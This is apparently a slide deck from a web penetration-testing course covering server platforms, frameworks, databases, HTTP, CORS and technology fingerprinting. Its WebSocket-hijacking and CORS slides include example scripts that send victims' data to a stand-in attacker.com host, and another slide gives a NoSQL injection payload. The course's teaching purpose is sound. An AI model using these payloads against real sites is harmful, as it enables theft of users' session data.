---
marp: true
theme: default
paginate: true
---

# Server Platforms & Web Technologies

## Understanding the Technology Stack

---

## Server Operating Systems

| OS | Market Share | Common Use |
|----|-------------|------------|
| **Linux** (Ubuntu, CentOS, RHEL) | ~75% of web servers | Most web applications |
| **Windows Server** | ~20% | `.NET`, `IIS`, enterprise |
| **FreeBSD** | ~3% | Netflix, WhatsApp |
| **Other Unix** | ~2% | Legacy systems |

- OS choice affects attack vectors and post-exploitation
- Identifying the OS is a key recon step

---

## Identifying the Server OS

```bash
# HTTP headers often leak OS info
curl -I https://target.com

# Example response headers
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
```

- `Server` header reveals web server and sometimes OS
- `X-Powered-By` reveals application framework
- Case sensitivity in URLs can hint at OS (Linux = case-sensitive)

---

## Web Server Software

```
+------------------+--------------------+-------------------+
|     Apache       |      Nginx         |       IIS         |
+------------------+--------------------+-------------------+
| - Most popular   | - Fastest growing  | - Windows only    |
| - .htaccess      | - Reverse proxy    | - .NET integrated |
| - mod_* modules  | - Load balancing   | - web.config      |
| - httpd.conf     | - nginx.conf       | - ISAPI filters   |
+------------------+--------------------+-------------------+
```

---

## Apache Configuration Pitfalls

```apache
# VULNERABLE: Directory listing enabled
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride None
</Directory>

# SECURE: Directory listing disabled
<Directory /var/www/html>
    Options -Indexes +FollowSymLinks
    AllowOverride None
</Directory>
```

- Directory listing exposes file structure
- `.htaccess` misconfigurations are common
- `mod_status` and `mod_info` should be disabled in production

---

## Nginx Security Headers

```nginx
# Security headers configuration
server {
    # Prevent clickjacking
    add_header X-Frame-Options "SAMEORIGIN" always;
    
    # Prevent MIME sniffing
    add_header X-Content-Type-Options "nosniff" always;
    
    # Enable XSS protection
    add_header X-XSS-Protection "1; mode=block" always;
    
    # Content Security Policy
    add_header Content-Security-Policy 
        "default-src 'self'; script-src 'self'" always;
    
    # HSTS
    add_header Strict-Transport-Security 
        "max-age=31536000; includeSubDomains" always;
}
```

---

## IIS Identification & Fingerprinting

```
IIS Version    ->  Windows Version
-----------        ---------------
IIS 6.0        ->  Windows Server 2003
IIS 7.0        ->  Windows Server 2008
IIS 7.5        ->  Windows Server 2008 R2
IIS 8.0        ->  Windows Server 2012
IIS 8.5        ->  Windows Server 2012 R2
IIS 10.0       ->  Windows Server 2016/2019/2022
```

- IIS version directly maps to Windows version
- `ASP.NET` version headers provide additional info
- `web.config` files can leak sensitive configuration

---

## Web Application Frameworks

| Language | Frameworks | Security Features |
|----------|-----------|-------------------|
| **Python** | Django, Flask, FastAPI | CSRF tokens, ORM |
| **JavaScript** | Express, Next.js, Nest | Helmet.js, CORS |
| **Java** | Spring, Struts, JSF | Spring Security |
| **PHP** | Laravel, Symfony | Eloquent ORM, CSRF |
| **Ruby** | Rails | Strong params, CSRF |
| **C#** | ASP.NET Core, MVC | AntiForgery, Identity |

---

## Framework Fingerprinting

```bash
# Common framework indicators
# PHP: .php extensions, PHPSESSID cookie
# Java: JSESSIONID cookie, .jsp/.do extensions
# ASP.NET: .aspx extensions, ASP.NET_SessionId cookie
# Python/Django: csrfmiddlewaretoken in forms
# Ruby/Rails: _session_id cookie, rails-specific paths

# Check cookies
curl -v https://target.com 2>&1 | grep -i "set-cookie"

# Check common paths
curl -s https://target.com/robots.txt
curl -s https://target.com/sitemap.xml
```

---

## Framework-Specific Attack Surfaces

```
Django:
  /admin/          -> Admin panel
  /static/         -> Static files
  DEBUG=True        -> Detailed error pages

Rails:
  /rails/info      -> Route info (dev mode)
  /assets/         -> Asset pipeline
  
Spring:
  /actuator/       -> Health, metrics, env
  /swagger-ui/     -> API documentation
  
Express:
  /api-docs/       -> Swagger docs
  X-Powered-By: Express  -> Header leak
```

---

## Data Stores - Relational Databases

| Database | Default Port | Common With |
|----------|-------------|-------------|
| `MySQL` / `MariaDB` | 3306 | PHP, Python, Java |
| `PostgreSQL` | 5432 | Python, Ruby, Java |
| `Microsoft SQL Server` | 1433 | `.NET`, Java |
| `Oracle` | 1521 | Java, enterprise |
| `SQLite` | File-based | Mobile, small apps |

- Each database has unique `SQL` dialect and features
- Error messages differ and aid in fingerprinting
- Default configurations often insecure

---

## NoSQL Data Stores

| Database | Type | Default Port |
|----------|------|-------------|
| `MongoDB` | Document | 27017 |
| `Redis` | Key-Value | 6379 |
| `Cassandra` | Wide-Column | 9042 |
| `CouchDB` | Document | 5984 |
| `Elasticsearch` | Search Engine | 9200 |

```javascript
// NoSQL Injection example (MongoDB)
// VULNERABLE: User input directly in query
db.users.find({ username: req.body.username, 
                 password: req.body.password });

// Attack payload: { "$gt": "" } always evaluates true
```

---

## Database Fingerprinting via Errors

```
MySQL:
  "You have an error in your SQL syntax..."
  
PostgreSQL:
  "ERROR: syntax error at or near..."
  
MSSQL:
  "Unclosed quotation mark after the character string..."
  
Oracle:
  "ORA-01756: quoted string not properly terminated"
  
MongoDB:
  "SyntaxError: Unexpected token..."
```

- Error messages are goldmines for attackers
- Production should **never** display raw database errors

---

## Client-Side Technologies

```
+---Browser Environment---+
|                          |
|  HTML5                   |
|  +---CSS3-----------+   |
|  |                   |   |
|  | +--JavaScript---+ |   |
|  | |               | |   |
|  | | React/Angular | |   |
|  | | Vue/Svelte    | |   |
|  | | jQuery        | |   |
|  | +---------------+ |   |
|  +-------------------+   |
|                          |
|  WebAssembly             |
|  Service Workers         |
|  Web Storage / IndexedDB |
|  WebSockets              |
+--------------------------+
```

---

## JavaScript Frameworks - Security Implications

```javascript
// React - JSX auto-escapes by default (SAFE)
const name = "<script>alert('xss')</script>";
return <div>{name}</div>;  // Escaped, safe

// BUT - dangerouslySetInnerHTML bypasses protection
return <div dangerouslySetInnerHTML={{__html: userInput}} />;
// VULNERABLE if userInput is not sanitized

// Angular - also auto-escapes templates
// BUT [innerHTML]="userInput" can be dangerous

// Vue.js - v-html directive is dangerous
// <div v-html="userInput"></div>  // VULNERABLE
```

---

## Single Page Applications (SPA) Security

- Client-side routing exposes API endpoints
- `JWT` tokens stored in `localStorage` vulnerable to `XSS`
- API keys embedded in `JavaScript` bundles
- Source maps in production reveal original code
- `CORS` misconfigurations enable cross-origin attacks

```bash
# Finding API endpoints in JavaScript bundles
curl -s https://target.com/static/js/main.js | \
  grep -oE '"/(api|v[0-9])/[^"]*"'

# Check for source maps
curl -s https://target.com/static/js/main.js.map
```

---

## WebSockets - Expanding Attack Surface

```javascript
// WebSocket connection
const ws = new WebSocket('wss://target.com/chat');

// Security concerns:
// 1. No same-origin policy enforcement
// 2. CSRF-like attacks (Cross-Site WebSocket Hijacking)
// 3. Message injection
// 4. Lack of authentication per-message

// Attack: Cross-Site WebSocket Hijacking
// From attacker's page:
const malicious = new WebSocket('wss://target.com/chat');
malicious.onmessage = (e) => {
    // Steal data from victim's session
    fetch('https://attacker.com/steal?data=' + e.data);
};
```

---

## Browser Storage Security

```javascript
// localStorage - Persistent, ~5MB, vulnerable to XSS
localStorage.setItem('token', 'eyJhbGciOiJI...');
// ANY JavaScript on the page can read this!

// sessionStorage - Tab-scoped, cleared on close
sessionStorage.setItem('temp', 'data');

// Cookies - Can be HttpOnly (no JS access)
// Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// IndexedDB - Large storage, also vulnerable to XSS
// Best practice: Never store sensitive tokens in
// localStorage or sessionStorage
```

---

## HTTP Protocol Fundamentals

```
GET /login HTTP/1.1              <-- Request Line
Host: target.com                 <-- Headers
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=abc123
                                 <-- Empty line
                                 <-- Body (empty for GET)

HTTP/1.1 200 OK                  <-- Status Line
Content-Type: text/html          <-- Response Headers
Set-Cookie: session=xyz789
Content-Length: 1234
                                 <-- Empty line
<html>...</html>                 <-- Response Body
```

---

## HTTP Methods & Security

| Method | Purpose | Security Notes |
|--------|---------|---------------|
| `GET` | Retrieve data | Params in URL, logged, cached |
| `POST` | Submit data | Body not in URL, not cached |
| `PUT` | Update/create | Can overwrite resources |
| `DELETE` | Remove resource | Must be authorized |
| `PATCH` | Partial update | Must validate fields |
| `OPTIONS` | Check methods | CORS preflight |
| `HEAD` | Get headers only | Info disclosure |
| `TRACE` | Debug/echo | XST attacks, disable it |

---

## HTTP Status Codes for Pentesters

```
200 OK              -> Resource found, access granted
301/302 Redirect    -> Follow to see where it goes
400 Bad Request     -> Malformed input, try variations
401 Unauthorized    -> Auth required, try bypasses
403 Forbidden       -> Access denied, try bypasses
404 Not Found       -> Resource doesn't exist (or does it?)
405 Method Not Allowed -> Try other HTTP methods
500 Internal Error  -> Server crash, possible injection
502 Bad Gateway     -> Backend server issue
503 Service Unavail -> Rate limiting or DoS indicator
```

> A `403` vs `404` difference reveals resource existence

---

## HTTPS/TLS Security

```bash
# Check TLS configuration
nmap --script ssl-enum-ciphers -p 443 target.com

# Test for common TLS issues
testssl.sh target.com

# Common findings:
# - SSLv3/TLS 1.0/1.1 still enabled
# - Weak cipher suites (RC4, DES, NULL)
# - Missing HSTS header
# - Certificate issues (expired, wrong domain)
# - BEAST, POODLE, Heartbleed vulnerabilities
```

---

## Content Types That Matter

```
text/html          -> Rendered as HTML (XSS risk)
application/json   -> Parsed as JSON (safer)
text/plain         -> Displayed as text (safer)
application/xml    -> Parsed as XML (XXE risk)
multipart/form-data -> File uploads (shell risk)
application/x-www-form-urlencoded -> Form data

# Mismatched Content-Type can lead to:
# - Browser MIME sniffing (XSS)
# - Parser confusion attacks
# - Content injection
```

---

## Encoding Schemes in Web Security

| Encoding | Example | Use |
|----------|---------|-----|
| URL encoding | `%3Cscript%3E` | URL parameters |
| HTML entities | `&lt;script&gt;` | HTML content |
| Base64 | `PHNjcmlwdD4=` | Binary data, tokens |
| Unicode | `\u003cscript\u003e` | JavaScript strings |
| Hex | `\x3cscript\x3e` | Bypass filters |
| Double encoding | `%253Cscript%253E` | Bypass WAFs |

---

## Proxy Architecture

```
+--------+    +-------+    +--------+    +----------+
| Browser|--->| Burp  |--->| WAF /  |--->| Web      |
|        |    | Suite  |    | CDN    |    | Server   |
|        |<---|        |<---|        |<---|          |
+--------+    +-------+    +--------+    +----------+
               Intercept    May modify    Origin
               & modify     requests      server
               requests
```

- Proxies allow inspection and modification of traffic
- Multiple proxy layers can complicate testing
- `CDN`s and `WAF`s add additional processing

---

## Technology Stack Identification - Summary

```bash
# Automated fingerprinting
whatweb https://target.com
wappalyzer  # Browser extension
builtwith   # Online service

# Manual checks
# 1. HTTP headers (Server, X-Powered-By)
# 2. Cookie names (PHPSESSID, JSESSIONID, etc.)
# 3. File extensions (.php, .aspx, .jsp)
# 4. HTML comments and meta tags
# 5. JavaScript framework artifacts
# 6. Error page formats
# 7. Default files (robots.txt, sitemap.xml)
# 8. Response timing characteristics
```

---

## CORS (Cross-Origin Resource Sharing)

```http
# CORS controls which origins can access resources
# Misconfiguration = data theft

# Browser sends:
Origin: https://attacker.com

# Vulnerable server responds:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
# Reflects ANY origin with credentials = critical vuln!

# Attack: Read sensitive data cross-origin
<script>
fetch('https://target.com/api/user/profile', {
    credentials: 'include'
}).then(r => r.json())
  .then(data => {
    // Send victim's data to attacker
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>

# Secure CORS configuration:
Access-Control-Allow-Origin: https://trusted-app.com
# Whitelist specific, trusted origins only
# Never reflect the Origin header blindly
```

---

## HTTP/2 and HTTP/3 Security Considerations

```
HTTP/2 Features:
  - Binary protocol (harder to inspect manually)
  - Multiplexed connections
  - Header compression (HPACK)
  - Server push
  - Potential for request smuggling

HTTP/2 Attack Vectors:
  - H2.CL and H2.TE request smuggling
  - HPACK bomb (decompression bomb)
  - Stream priority manipulation (DoS)
  - Pseudo-header injection

Testing HTTP/2:
  - Burp Suite handles HTTP/2 transparently
  - Use --http2 flag with curl
  - h2spec tool for compliance testing

HTTP/3 (QUIC):
  - UDP-based transport
  - Built-in TLS 1.3
  - Different network monitoring approach needed
```

---

## Lab Exercise: Technology Fingerprinting

**Objective**: Identify the complete technology stack of a target

1. Set up Burp Suite as your browser proxy
2. Browse to the target application
3. Examine `HTTP` response headers
4. Check cookie names and values
5. View page source for framework indicators
6. Run `whatweb` against the target
7. Document all technologies identified

```bash
whatweb -v https://target-lab.local
nikto -h https://target-lab.local
```

---

## Summary

- Web applications have complex, multi-layered stacks
- Each technology layer introduces unique vulnerabilities
- OS, web server, framework, and database all matter
- Client-side technologies are increasingly complex
- `HTTP` is the foundation - understand it deeply
- Technology fingerprinting is the first step in any assessment
- Always check for misconfigurations at every layer

> Next: Offensive Toolset & Practice Targets
